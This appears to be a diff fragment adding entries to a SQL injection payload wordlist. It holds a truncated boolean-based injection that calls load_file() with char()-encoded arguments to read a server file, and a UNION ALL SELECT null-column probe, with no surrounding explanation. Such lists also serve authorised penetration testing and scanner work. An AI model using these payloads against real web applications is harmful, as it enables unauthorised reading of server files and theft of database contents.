@@ -1,0 +1,4 @@
+' and 1 =  (  if  (  (  load_file ( char ( 110,46,101,120,11 ...',
+
+1  )   union all select null,null,null,null--
+
